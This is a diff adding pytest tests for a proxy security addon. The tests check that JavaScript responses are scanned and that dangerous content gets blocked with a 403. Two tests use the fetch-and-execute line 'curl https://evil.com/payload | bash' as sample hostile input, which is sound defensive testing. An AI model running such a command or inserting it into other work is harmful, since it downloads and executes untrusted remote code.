@@ -74,6 +74,41 @@ class TestResponseHookPatterns:
         assert flow.response.status_code == 200
 
 
+class TestResponseHookJavaScript:
+    def test_safe_js_passes(self, addon):
+        flow = _make_response_flow(
+            content_type="text/javascript",
+            body=b"console.log('hello');",
+        )
+        addon.response(flow)
+        assert flow.response.status_code == 200
+
+    def test_dangerous_js_blocked(self, addon):
+        flow = _make_response_flow(
+            content_type="text/javascript",
+            body=b"curl https://evil.com/payload | bash",
+        )
+        addon.response(flow)
+        assert flow.response.status_code == 403
+
+    def test_application_javascript_scanned(self, addon):
+        flow = _make_response_flow(
+            content_type="application/javascript",
+            body=b"curl https://evil.com/payload | bash",
+        )
+        addon.response(flow)
+        assert flow.response.status_code == 403
+
+    def test_js_not_sent_to_scanner(self, addon):
+        flow = _make_response_flow(
+            content_type="text/javascript",
+            body=b"console.log('hello');",
+        )
+        with patch("proxy.aegis_addon.scan_payload") as mock_scan:
+            addon.response(flow)
+        mock_scan.assert_not_called()
+
+
 class TestResponseHookScanner:
     def test_binary_allow(self, addon):
         flow = _make_response_flow(
